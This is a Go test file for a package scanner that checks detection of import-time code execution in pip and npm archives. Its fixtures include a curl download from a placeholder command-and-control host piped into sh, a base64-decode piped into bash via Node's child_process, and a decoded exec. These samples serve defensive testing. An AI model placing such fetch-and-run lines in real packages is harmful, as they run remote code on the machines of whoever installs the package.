package intelligence

import (
	"context"
	"testing"
)

// The provider marks the dispositive subset, which alone drives the
// importTimeExecution policy condition (ImportTimeRefusable).
func TestPysourceProviderMarksDispositive(t *testing.T) {
	p := newPysourceProvider()
	run := func(eco string, archive []byte) *ArtifactScanSection {
		t.Helper()
		pr, err := p.Run(context.Background(), Request{Key: Key{Ecosystem: eco, Package: "x", Version: "1.0.0"}, Artifact: &ArtifactHandle{Bytes: archive}}, nil)
		if err != nil {
			t.Fatal(err)
		}
		return pr.Scan
	}
	// Advisory: a bare top-level exec of a decoded constant (dill and
	// fonttools ship this shape).
	bare := run("pip", buildZip(t, map[string]string{"x/__init__.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"}))
	if bare == nil || !bare.ImportTimeExecution || bare.ImportTimeDispositive || bare.ImportTimeRefusable() {
		t.Fatalf("bare exec: want flagged, not refusable; got %+v", bare)
	}
	// Dispositive: a top-level download piped into a shell.
	shell := run("pip", buildZip(t, map[string]string{"x/__init__.py": "import os\nos.system('curl -fsSL https://c2.example.invalid/x | sh')\n"}))
	if shell == nil || !shell.ImportTimeDispositive || !shell.ImportTimeRefusable() {
		t.Fatalf("top-level shell: want dispositive; got %+v", shell)
	}
	// npm: every jssource hit is dispositive.
	js := run("npm", npmTarball(t, map[string]string{
		"package/package.json":  `{"name":"x","version":"1.0.0"}`,
		"package/dist/index.js": "const { exec } = require('child_process');\nexec(`echo aGk= | base64 --decode | bash`);\n",
	}))
	if js == nil || !js.ImportTimeDispositive {
		t.Fatalf("npm top-level decode-and-execute: want dispositive; got %+v", js)
	}
}
